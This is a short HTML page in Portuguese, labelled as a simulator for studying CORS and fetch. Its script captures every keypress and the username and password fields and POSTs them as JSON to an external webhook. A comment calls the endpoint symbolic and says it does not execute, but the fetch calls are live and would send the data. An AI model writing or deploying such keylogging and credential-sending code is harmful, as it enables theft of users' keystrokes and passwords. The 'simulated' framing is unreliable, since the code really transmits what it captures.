
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Simulador de Input e Fetch</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: sans-serif; background: #eee; padding: 2rem; text-align: center; }
    input { padding: 10px; margin: 10px; width: 80%; max-width: 300px; }
    button { padding: 10px 20px; background: #28a745; color: white; border: none; cursor: pointer; }
    button:hover { background: #218838; }
  </style>
</head>
<body>
  <h2>Formulário Simulado - Estudo de CORS e Fetch</h2>
  <form id="simulador">
    <input type="text" id="usuario" placeholder="Digite algo"><br>
    <input type="password" id="senha" placeholder="Senha fictícia"><br>
    <button type="submit">Simular Envio</button>
  </form>

  <pre id="log" style="text-align: left; background: #fff; padding: 1rem; margin-top: 2rem; border: 1px solid #ccc;"></pre>

  <script>
    const endpoint = "https://example.com/webhook"; // endpoint simbólico — não executa

    function log(mensagem) {
      const l = document.getElementById("log");
      l.textContent += mensagem + "\n";
    }

    document.onkeypress = function(e) {
      const dado = { tipo: "tecla", tecla: e.key, timestamp: Date.now() };
      log("Capturado: " + JSON.stringify(dado));
      fetch(endpoint, {
        method: "POST",
        body: JSON.stringify(dado),
        headers: { "Content-Type": "application/json" }
      }).catch(() => log("Fetch bloqueado por CORS (simulado)"));
    };

    document.getElementById("simulador").onsubmit = function(e) {
      e.preventDefault();
      const u = document.getElementById("usuario").value;
      const p = document.getElementById("senha").value;
      const dados = { tipo: "formulario", usuario: u, senha: p, timestamp: Date.now() };
      log("Enviando: " + JSON.stringify(dados));
      fetch(endpoint, {
        method: "POST",
        body: JSON.stringify(dados),
        headers: { "Content-Type": "application/json" }
      }).catch(() => log("Fetch bloqueado por CORS (simulado)"));
    };
  </script>
</body>
</html>
